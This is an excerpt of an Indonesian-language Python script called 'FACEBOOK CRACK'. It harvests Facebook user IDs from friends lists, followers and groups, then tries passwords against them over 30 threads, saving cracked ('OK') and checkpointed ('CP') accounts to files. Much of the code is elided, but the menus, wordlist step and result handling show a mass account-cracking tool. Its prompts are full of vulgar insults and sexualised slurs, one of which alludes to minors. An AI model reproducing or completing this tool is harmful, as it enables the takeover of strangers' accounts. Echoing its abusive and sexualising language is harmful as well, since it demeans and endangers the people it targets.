...
def banner():
	...
	print(f'\t       FACEBOOK CRACK  ')
	print(f'\t  Author <•> KAKEK & NENEK KAU ')
	print(f'\t    From <•> NEGARA API ')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'  %s[%sx%s]%s LOGIN LU GAGAL NGENTOD !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
 ...
 #  gh = 'github.com/Sholeh-XDy'
	cetak(nel('\tSelamat Datang [yellow]%s[blue] SAYANGKU'%(my_name)))
...
# print('>> 4. Crack File	')
	print('<•> 5. Hasil Crack  ')
	print('<•> 0. Keluar       ')
	_____anak__ngentod_____ = input('\n<•> Pilih : ')
	if _____anak__ngentod_____ in ['1']:
		dump_massal()
	elif _____anak__ngentod_____ in ['2']:
		dump_follower()
	elif _____anak__ngentod_____ in ['3']:
		grup()
	elif _____anak__ngentod_____ in ['4']:
		crack_file()
	elif _____anak__ngentod_____ in ['5']:
		result()
	elif _____anak__ngentod_____ in ['0']:
		...
		back()
def error():
	print(f'{k}<•> TF dan buat kopi, baru bisa jalan 085157554344 /Dea.. {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'<•> 1. Hasil {u}OK{x} Anda ')
	print(f'<•> 2. Hasil {m}CP{x} Anda ')
	print('<•> 3. Kembali	')
	kz = input(f'\n<•> Pilih : ')
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			for cpku in range(len(lin)):
				...
				print(f'{x}<•> {m}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{h} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				if cih<10:
					...
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'<•> %s. %s ( {u}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}<•> {u}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{k} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
...
def dump_massal():
	...
	try:
		...
		print('<•> Masukkan Angka NGENTOD,  jangan Huruff ')
		exit()
	if jum<1 or jum>100:
	...
	try:
		print('')
		print(f'<•> ID SIAP CARI LONTE {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		...
		print(f'<•>{k} Pertemanan Tidak Public ,CARI YANG LAIN , PAHAMMM!!!!! {x}')
		time.sleep(3)
		back()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}<•> 1. Akun KAKEK NENEK LU ')
	print('<•> 2. Akun LOLI COLMEK ')
	print('<•> 3. RANDOM MEMEK ')
	hu = input('<•> Pilih : ')
	if hu in ['1','01']:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Mencintai Dalam Diam {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'<•> Hasil {u}OK{x} Tersimpan Di : {u}OK/%s {x}'%(okc))
	print(f'<•> Hasil {m}CP{x} Tersimpan Di : {m}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai SAYANG, Waktunya bubuk manis [green] ✓[orange] '))
	print(f'[{b}•{x}]{m} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{u} CP : {k}%s{x} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r👁RW X LEDA {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{K}{ok}{P}]—{P}[{H}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/ANAK KONTOL')
	except:pass
